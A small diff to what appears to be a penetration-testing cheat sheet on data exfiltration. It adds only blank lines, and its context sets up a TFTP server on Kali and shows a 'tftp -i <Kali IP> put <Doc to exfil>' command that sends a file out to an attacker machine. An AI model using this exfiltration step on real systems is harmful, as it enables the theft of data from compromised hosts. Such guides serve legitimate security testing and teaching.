@@ -214,6 +214,7 @@ Rarely works (often restricted by egress firewall rules), but can come handy in 
 For example, it can be used on older systems if PowerShell isn't installed.
 
 - Install and configure a TFTP server on Kali/Linux (receiving end):
+
 ````
 sudo apt update && sudo apt install atftp
 sudo mkdir /tftp
@@ -222,6 +223,7 @@ sudo atftpd --daemon --port 69 /tftp
 ````
 
 - On the sending end, run the TFTP client with _-i_ to specify a binary image transfer:
+
 ````
 tftp -i <Kali IP> put <Doc to exfil>
 ````
